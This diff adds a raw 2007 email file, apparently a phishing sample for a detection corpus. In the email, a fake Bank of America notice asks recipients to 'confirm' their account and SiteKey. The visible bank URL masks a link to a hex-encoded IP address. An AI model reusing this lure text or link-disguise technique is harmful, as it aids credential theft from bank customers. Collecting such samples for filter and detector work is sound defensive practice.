@@ -1,0 +1,56 @@
+From nobody Sun Jan 25 13:50:01 2015
+Return-Path: <service@bankofamerica.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 68E464691C
+ for <user@login.example.com>; Wed,  7 Feb 2007 07:04:36 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 69736131FD8F
+ for <user@example.com>; Wed,  7 Feb 2007 07:04:36 -0500 (EST)
+Received: from bo (cpe-68-203-163-181.houston.res.rr.com [68.203.163.181])
+ by mail.example.org (Postfix) with ESMTP id 61EA66FA1C1
+ for <user@example.com>; Wed,  7 Feb 2007 07:04:36 -0500 (EST)
+Received: from User ([216.203.152.185]) by bo with Microsoft
+ SMTPSVC(5.0.2195.6713); Wed, 7 Feb 2007 06:26:26 -0600
+From: "Bank of America Service"<service@bankofamerica.com>
+Subject: Please Update Your Profile - Personal Information Error
+Date: Wed, 7 Feb 2007 06:04:32 -0600
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <BOR7mOuf0fLCBTQYIcV0000012f@bo>
+X-OriginalArrivalTime: 07 Feb 2007 12:26:26.0619 (UTC)
+ FILETIME=[2FE078B0:01C74AB3]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 772
+
+<html>
+<img src="http://www.bankofamerica.com/images/mhd_reg_logo.gif">
+<style>
+.text2 {
+	FONT-SIZE: 80%; COLOR: #333333; FONT-FAMILY: Verdana
+}
+</style>
+<br>
+<SPAN class=text2>Dear Bank of America Client,<br><br>
+<br>During our regularly scheduled account maintenance and verification procedures,
+<br>we have detected a slight error in your account information.
+<br>To securely confirm your personal information please click on the link bellow:
+<br>
+<br><a href="http://0x3B.0x97.0x38.0x51/re.htm">http://www.bankofamerica.com/sas/sitekey/profile/step1.htm</a>
+<br><br>Confirm Your Bank of America Account and SiteKey now to enjoy the benefits of
+<br>online banking and finance to avoid identity theft and fraudulent activities on
+<br>your account.
+<br><br><b>Note: We will be upgrading our yearly SSL EncryptedServer to prevent fraudulent
+<br>activity.</b>
+<br><br>© 2006 Bank of America Corporation. All rights reserved.
+</span></html>
